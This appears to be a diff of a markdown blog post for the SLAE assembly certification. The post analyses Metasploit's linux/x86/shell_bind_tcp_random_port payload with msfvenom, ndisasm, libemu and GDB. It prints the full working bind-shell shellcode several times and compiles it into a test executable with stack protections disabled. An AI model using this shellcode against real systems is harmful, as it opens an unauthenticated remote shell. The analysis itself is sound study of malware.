@@ -1,14 +1,13 @@
-
-## 5.3 Payload *linux/x86/shell_bind_tcp_random_port*
+# 5.3 Payload *linux/x86/shell_bind_tcp_random_port*
 
 ### Check options
 ```bash
 msfvenom -p linux/x86/shell_bind_tcp_random_port --list-options
 ```
 
-![Screenshot](../images/randbind/1.png)
+![Screenshot](images/randbind/1.png)
 
-![Screenshot](../images/randbind/2.png)
+![Screenshot](images/randbind/2.png)
 
 There is not any basic option in this case.
 
@@ -28,7 +27,7 @@ msfvenom -p linux/x86/shell_bind_tcp_random_port --platform=Linux -a x86 -f c | 
 
 Using it, we get the shellcode we will use for the study of the payload:
 
-![Screenshot](../images/randbind/3.png)
+![Screenshot](images/randbind/3.png)
 
 
 
@@ -47,7 +46,7 @@ Or a little quicker:
 echo -ne "\x31\xdb\xf7\xe3\xb0\x66\x43\x52\x53\x6a\x02\x89\xe1\xcd\x80\x52\x50\x89\xe1\xb0\x66\xb3\x04\xcd\x80\xb0\x66\x43\xcd\x80\x59\x93\x6a\x3f\x58\xcd\x80\x49\x79\xf8\xb0\x0b\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x41\xcd\x80" | ndisasm -u -
 ```
 
-![Screenshot](../images/randbind/6.png)
+![Screenshot](images/randbind/6.png)
 
 Using awk it is possible to get only the part we want and create a .nasm file:
 
@@ -57,7 +56,7 @@ echo -e "section .text\nglobal _start \n_start:" > 3.nasm
 echo -ne "\x31\xdb\xf7\xe3\xb0\x66\x43\x52\x53\x6a\x02\x89\xe1\xcd\x80\x52\x50\x89\xe1\xb0\x66\xb3\x04\xcd\x80\xb0\x66\x43\xcd\x80\x59\x93\x6a\x3f\x58\xcd\x80\x49\x79\xf8\xb0\x0b\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x41\xcd\x80" | ndisasm -u - | awk '{$2=$2};1' - | cut -d " " -f 3-10 >> 3.nasm
 ```
 
-![Screenshot](../images/randbind/7.png)
+![Screenshot](images/randbind/7.png)
 
 
 
@@ -69,7 +68,7 @@ In this case Libemu works correctly:
 echo -ne "\x31\xdb\xf7\xe3\xb0\x66\x43\x52\x53\x6a\x02\x89\xe1\xcd\x80\x52\x50\x89\xe1\xb0\x66\xb3\x04\xcd\x80\xb0\x66\x43\xcd\x80\x59\x93\x6a\x3f\x58\xcd\x80\x49\x79\xf8\xb0\x0b\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x41\xcd\x80" |  ./sctest -vvv -Ss 10000 -G randbind.dot
 ```
 
-![Screenshot](../images/randbind/4.png)
+![Screenshot](images/randbind/4.png)
 
 We get the next output:
 
@@ -164,11 +163,11 @@ int execve (
 
 Finally the PNG picture is created using:
 
-```
+```bash
 dot randbind.dot -T png -o randbind.png
 ```
 
-![Screenshot](../images/randbind/5.png)
+![Screenshot](images/randbind/5.png)
 
 
 ### Studying the syscalls
@@ -177,7 +176,7 @@ Given we have the nasm code, the first thing to do will be studying the differen
 
 In this case we have five syscalls:
 
-![Screenshot](../images/randbind/8.png)
+![Screenshot](images/randbind/8.png)
 
 After checking the */usr/include/i386-linux-gnu/asm/unistd_32.h* file, the syscalls seem different to the ones we got using Libemu:
 
@@ -208,7 +207,7 @@ The nasm file states the list of syscalls is:
 
 So Libemu interprets which is the specific socket call in the first three syscalls.
 
-![Screenshot](../images/randbind/9.png)
+![Screenshot](images/randbind/9.png)
 
 
 
@@ -216,11 +215,11 @@ So Libemu interprets which is the specific socket call in the first three syscal
 
 In this third case, it is possible to compile the NASM code and generate a working executable, but it crashes after connecting to the port:
 
-![Screenshot](../images/randbind/22.png)
+![Screenshot](images/randbind/22.png)
 
 So again, itt is necessary to use the *shellcode.c* file:
 
-![Screenshot](../images/randbind/23.png)
+![Screenshot](images/randbind/23.png)
 
 It is compiled:
 
@@ -230,40 +229,40 @@ gcc -fno-stack-protector -z execstack shellcode.c -o 3
 
 An executable named "3" gets generated. It is possible to execute it and check that it works correctly:
 
-![Screenshot](../images/randbind/24.png)
+![Screenshot](images/randbind/24.png)
 
 
 Also it is possible to look for interesting strings like this one:
 
-![Screenshot](../images/randbind/11.png)
+![Screenshot](images/randbind/11.png)
 
 
 ### Study with GDB
 
 We attach the executable in quiet mode, set the disassembly flavor, define the "hook-stop" function, run the program and stop in the main function:
 
-![Screenshot](../images/randbind/12.png)
+![Screenshot](images/randbind/12.png)
 
 Now, we must jump to the shellcode, so we set a breakpoint in the last 'call eax' instruction visible in the previous screenshot (the previous call instructions show the length of the shellcode).
 
 We continue for one instruction using 'stepi' and the 'disassemble' command shows we have reached the shellcode. All the shellcode with the five syscalls can be read:
 
-![Screenshot](../images/randbind/12_5.png)
+![Screenshot](images/randbind/12_5.png)
 
 We set breakpoint in every one of them:
 
-![Screenshot](../images/randbind/14.png)
+![Screenshot](images/randbind/14.png)
 
 
 #### Syscall 1
 
 We reach the first syscall:
 
-![Screenshot](../images/randbind/15.png)
+![Screenshot](images/randbind/15.png)
 
 We read the man page of socketcall:
 
-![Screenshot](../images/randbind/16.png)
+![Screenshot](images/randbind/16.png)
 
 And then the values are:
 
@@ -273,7 +272,7 @@ And then the values are:
 
 - ECX = -1073745200 => The stack address containing the pushed values "0x2" (*domain* is AF_INET), "0x1" (*type* is SOCK_STREAM) and "0x0" (*protocol* is not set):
 
-![Screenshot](../images/randbind/31.png)
+![Screenshot](images/randbind/31.png)
 
 
 
@@ -281,11 +280,11 @@ And then the values are:
 
 We reach the second syscall:
 
-![Screenshot](../images/randbind/17.png)
+![Screenshot](images/randbind/17.png)
 
 We read the man page of socketcall:
 
-![Screenshot](../images/randbind/16.png)
+![Screenshot](images/randbind/16.png)
 
 And then the values are:
 
@@ -295,7 +294,7 @@ And then the values are:
 
 - ECX = -1073745208 => The stack address containing the values "0x3" (*s*, the file descriptor) and "0x0" (*backlog*, which defines the maximum length to which the queue of pending connections for sockfd may grow.)
 
-![Screenshot](../images/randbind/32.png)
+![Screenshot](images/randbind/32.png)
 
 
 
@@ -303,11 +302,11 @@ And then the values are:
 
 We reach the third syscall:
 
-![Screenshot](../images/randbind/18.png)
+![Screenshot](images/randbind/18.png)
 
 We read the man page of socketcall:
 
-![Screenshot](../images/randbind/16.png)
+![Screenshot](images/randbind/16.png)
 
 And then the values are:
 
@@ -317,23 +316,23 @@ And then the values are:
 
 - ECX = -1073745208 => The stack address containing the values "0x3" (*socketfd*, the file descriptor), "0X0" (*addr*, so the address is '0.0.0.0') and "0x2" (*addrlen*, so the length of the address is 32 bits)
 
-![Screenshot](../images/randbind/33.png)
+![Screenshot](images/randbind/33.png)
 
 
 Now, it is necessary to check which is the port opened and connect to it:
 
-![Screenshot](../images/randbind/19.png)
+![Screenshot](images/randbind/19.png)
 
 
 #### Syscall 4
 
 Then, we reach the fourth syscall:
 
-![Screenshot](../images/randbind/20.png)
+![Screenshot](images/randbind/20.png)
 
 We read the man page of dup2:
 
-![Screenshot](../images/randbind/25.png)
+![Screenshot](images/randbind/25.png)
 
 And then the values are:
 
@@ -350,11 +349,11 @@ Later the breakpoint is reached again only changing the ECX value to 2, 1 and th
 
 We reach the fifth syscall:
 
-![Screenshot](../images/randbind/27.png)
+![Screenshot](images/randbind/27.png)
 
 We read the man page of execve:
 
-![Screenshot](../images/randbind/26.png)
+![Screenshot](images/randbind/26.png)
 
 And then the values are:
 
@@ -371,23 +370,10 @@ And then the values are:
 
 Now we can update the nasm code adding the necessary jump:
 
-![Screenshot](../images/randbind/28.png)
+![Screenshot](images/randbind/28.png)
 
 Finally we can compile the nasm file and check it works correctly:
 
-![Screenshot](../images/randbind/29.png)
+![Screenshot](images/randbind/29.png)
 
-![Screenshot](../images/randbind/30.png)
-
-
-
----------------------------------------------------
-
-
-## Note
-
-This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: https://www.pentesteracademy.com/course?id=3
-
-Student ID: SLAE - 1433
-
-
+![Screenshot](images/randbind/30.png)
